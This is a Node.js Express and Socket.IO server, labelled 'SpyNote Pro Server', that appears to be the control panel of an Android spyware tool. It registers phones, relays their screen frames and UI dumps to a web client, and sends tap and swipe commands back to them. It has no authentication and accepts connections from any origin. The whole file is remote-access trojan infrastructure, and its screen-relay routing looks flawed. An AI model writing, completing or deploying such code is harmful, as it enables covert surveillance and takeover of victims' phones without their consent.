const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 60000,
    pingInterval: 25000,
    maxHttpBufferSize: 50e6 // ✅ 50MB for screen frames
});

app.use(compression());
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json({ limit: '50mb' }));

const devices = new Map();

app.post('/register', (req, res) => {
    const { deviceId, model, brand, version, status } = req.body;
    if (deviceId) {
        devices.set(deviceId, { model, brand, version, status, connected: true });
        console.log("✅ Device registered:", deviceId);
        io.emit('devices-update', Array.from(devices.entries()));
    }
    res.json({ success: true });
});

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

io.on('connection', (socket) => {
    console.log('🔌 Web client connected:', socket.id);

    socket.on('select-device', ({ deviceId }) => {
        console.log('🎮 Web selected device:', deviceId);
    });

    // 🔥 SCREEN + UI RELAY
    socket.on('screen-frame', (data) => {
        if (devices.has(data.deviceId)) {
            socket.to(data.deviceId).emit('screen-update', data);
        }
    });

    socket.on('ui-dump', (data) => {
        if (devices.has(data.deviceId)) {
            socket.to(data.deviceId).emit('ui-elements', data.elements);
        }
    });

    // 🔥 CONTROL RELAY (Web → Phone)
    socket.on('control', (data) => {
        const { deviceId, action, x, y, startX, startY, endX, endY } = data;
        if (devices.has(deviceId)) {
            io.to(deviceId).emit('control', {
                action, x: Number(x), y: Number(y),
                startX: Number(startX), startY: Number(startY),
                endX: Number(endX), endY: Number(endY)
            });
            console.log(`🎮 ${action.toUpperCase()} → ${deviceId}`);
        }
    });

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, connected: true, socketId: socket.id 
            });
            socket.join(deviceId);
            io.emit('devices-update', Array.from(devices.entries()));
            console.log(`📱 Device ${deviceId.slice(0,12)}... LIVE`);
        }
    });

    socket.on('disconnect', () => {
        for (const [deviceId, info] of devices) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                io.emit('devices-update', Array.from(devices.entries()));
                console.log(`📴 Device ${deviceId.slice(0,12)}... OFFLINE`);
                break;
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🚀 SpyNote Pro Server: http://localhost:${PORT}`);
    console.log(`📱 Ready for Android devices!\n`);
});
